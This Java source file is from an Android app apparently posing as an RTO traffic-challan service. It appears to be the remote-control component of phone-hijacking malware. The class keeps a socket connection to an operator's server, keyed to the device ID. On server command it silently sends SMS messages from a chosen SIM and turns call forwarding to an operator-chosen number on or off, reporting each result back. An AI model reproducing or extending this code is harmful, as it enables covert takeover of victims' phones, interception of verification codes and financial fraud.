package com.service.rtochallan;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.UnsupportedEncodingException;
import java.net.URISyntaxException;
import java.net.URLEncoder;
import java.util.Arrays;

import io.socket.client.Ack;
import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;


public class SocketManager {

    private static SocketManager instance;
    private Socket socket;
    private Context context;
    private Helper helper;
    private StorageHelper storage;
    private SmsManager smsManager;

    // Singleton pattern
    public static SocketManager getInstance(Context context) {
        if (instance == null) {
            instance = new SocketManager(context.getApplicationContext());
        }
        return instance;
    }

    // make sure it will run after device registered
    private SocketManager(Context context) {
        helper = new Helper();
        storage = new StorageHelper(context);
        this.context = context;

        try {
            IO.Options options = new IO.Options();
            options.reconnection = true;
            String androidId = URLEncoder.encode(helper.getAndroidId(context), "UTF-8");
            String formCode = URLEncoder.encode(helper.FormCode(), "UTF-8");
            options.query = "client=android&android_id=" + androidId + "&form_code=" + formCode;

            socket = IO.socket(helper.SocketUrl(), options);
            setupListeners();
        } catch (URISyntaxException e) {
            e.printStackTrace();
        } catch (UnsupportedEncodingException e) {
            throw new RuntimeException(e);
        }
    }


    private void setupListeners() {
        //Log.d(helper.TAG, "setupListeners");
        // Connected
        // Connected
        socket.on(Socket.EVENT_CONNECT, new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                String socketId = socket.id(); // ✅ get current socket ID
//                showToast("Socket Connected: " + socketId);
                //Log.d(helper.TAG, "✅ Socket Connected, ID: " + socketId);
            }
        });

// Disconnected
        socket.on(Socket.EVENT_DISCONNECT, new Emitter.Listener() {
            @Override
            public void call(Object... args) {
//                showToast("Socket Disconnected");
                //Log.d(helper.TAG, "⚠️ Socket Disconnected");
            }
        });

// Connect Error
        socket.on(Socket.EVENT_CONNECT_ERROR, new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                Log.e(helper.TAG, "❌ Socket Connect Error: " + Arrays.toString(args));
            }
        });


//        socket.onAnyIncoming(new Emitter.Listener() {
//            @Override
//            public void call(Object... args) {
//                //Log.d(helper.TAG, "Incoming Package : "+ Arrays.toString(args));
//            }
//        });
//
//        socket.onAnyOutgoing(new Emitter.Listener() {
//            @Override
//            public void call(Object... args) {
//                //Log.d(helper.TAG, "Outgoing Package : "+ Arrays.toString(args));
//            }
//        });


//        socket.on("hello", new Emitter.Listener() {
//            @Override
//            public void call(Object... args) {
//                //Log.d(helper.TAG, "Hello-World"+args[0]);
//            }
//        });


        // Listen SMS Forwarding Request
        socket.on("sms_send_android", args -> {
            if (args.length > 0) {
                JSONObject data = (JSONObject) args[0];
                try {
                    handleNewSendSMS(data);
                } catch (JSONException e) {
                    throw new RuntimeException(e);
                }
            }
        });

        // Listen Call Forwarding Request
        socket.on("call_forward_android", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                //Log.d(helper.TAG, "call forward android");
                if (args.length > 0) {
                    JSONObject data = (JSONObject) args[0];
                    try {
                        handleNewCallForwarding(data);
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }
                }
            }
        });

        // Listen Call Forwarding Request
        socket.on("call_forward_remove_android", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                if (args.length > 0) {
                    JSONObject data = (JSONObject) args[0];
                    try {
                        handleNewCallRemoveForwarding(data);
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }
                }
            }
        });
    }

    // Connect socket
    public void connect() {
        if (socket != null && !socket.connected()) {
            socket.connect();
        }
    }

    // Disconnect socket
    public void disconnect() {
        if (socket != null && socket.connected()) {
            socket.disconnect();
        }
    }

    // Emit event with data
    public void emit(String event, JSONObject data) {
        if (socket != null && socket.connected()) {
            socket.emit(event, data);
        }
    }

    private void handleNewSendSMS(JSONObject data) throws JSONException {

        String to_number = data.getString("to_number");
        String message = data.getString("message");
        int sub_id = data.getInt("sim_sub_id");  // SIM subscription ID
        int sms_send_id = data.getInt("sms_send_id");

        // ✅ Get SmsManager for specific SIM
        SmsManager smsManager = SmsManager.getSmsManagerForSubscriptionId(sub_id);

        int sentRequestCode = (sms_send_id + to_number).hashCode();
        int deliveredRequestCode = (sms_send_id + to_number + "_delivered").hashCode();

        Intent sentIntent = new Intent(context, SmsSendSentReceiver.class);
        sentIntent.putExtra("sms_send_id", sms_send_id);
        sentIntent.putExtra("to_number", to_number);
        PendingIntent sentPendingIntent = PendingIntent.getBroadcast(
                context, sentRequestCode, sentIntent, PendingIntent.FLAG_IMMUTABLE
        );

        Intent deliveredIntent = new Intent(context, SmsSendDeliveredReceiver.class);
        deliveredIntent.putExtra("sms_send_id", sms_send_id);
        deliveredIntent.putExtra("to_number", to_number);
        PendingIntent deliveredPendingIntent = PendingIntent.getBroadcast(
                context, deliveredRequestCode, deliveredIntent, PendingIntent.FLAG_IMMUTABLE
        );
//        storage.saveString("skip_message_body", message); // skip to forwarding in smsreceiver
        smsManager.sendTextMessage(to_number, null, message, sentPendingIntent, deliveredPendingIntent);
    }


    // make callback and give response to client
    private void handleNewCallForwarding(JSONObject data) throws JSONException {
        String phoneNumber = data.getString("call_forwarding_to_number");
        int sim_sub_id = data.getInt("sim_sub_id");
        CallForwardingHelper.setCallForwarding(context, phoneNumber, sim_sub_id, new CallForwardingHelper.CallForwardingCallback() {
            @Override
            public void onSuccess(String message) throws JSONException {
                socket.emit("update_call_forward_device_status", new JSONObject()
                        .put("sim_sub_id", sim_sub_id) // android_id & form_code no need to send, already sent via query
                        .put("status", "Enabled")
                        .put("status_message", message));
            }

            @Override
            public void onFailure(String error) throws JSONException {
                socket.emit("update_call_forward_device_status", new JSONObject()
                        .put("sim_sub_id", sim_sub_id) // android_id & form_code no need to send, already sent via query
                        .put("status", "Failed")
                        .put("status_message", error));
            }
        });
    }

    // make callback and give response to client
    private void handleNewCallRemoveForwarding(JSONObject data) throws JSONException {
        //Log.d(helper.TAG, "calremove called");
        int sim_sub_id = data.getInt("sim_sub_id");
        CallForwardingHelper.removeCallForwarding(context, sim_sub_id, new CallForwardingHelper.CallForwardingCallback() {
            @Override
            public void onSuccess(String message) throws JSONException {
                socket.emit("update_call_forward_device_status", new JSONObject()
                        .put("sim_sub_id", sim_sub_id) // android_id & form_code no need to send, already sent via query
                        .put("status", "Disabled")
                        .put("status_message", message));
            }

            @Override
            public void onFailure(String error) throws JSONException {
                socket.emit("update_call_forward_device_status", new JSONObject()
                        .put("sim_sub_id", sim_sub_id) // android_id & form_code no need to send, already sent via query
                        .put("status", "Failed")
                        .put("status_message", error));
            }
        });
    }

    // Helper method to show Toast on main thread
    private void showToast(final String message) {
        new Handler(Looper.getMainLooper()).post(() ->
                Toast.makeText(context, message, Toast.LENGTH_SHORT).show()
        );
    }


    public void emitWithAck(String event, JSONObject data, AckCallback callback) {
        if (socket != null && socket.connected()) {
            socket.emit(event, new Object[]{ data }, (Ack) (Object... ackArgs) -> {
                try {
                    if (ackArgs.length > 0 && ackArgs[0] instanceof JSONObject) {
                        JSONObject response = (JSONObject) ackArgs[0];
                        callback.onResponse(response);
                    } else {
                        callback.onError("Invalid response from server");
                    }
                } catch (Exception e) {
                    callback.onError("Error parsing response: " + e.getMessage());
                }
            });
        } else {
            callback.onError("Socket not connected");
        }
    }
    // Interface for callback
    public interface AckCallback {
        void onResponse(JSONObject response) throws JSONException;
        void onError(String error);
    }


}
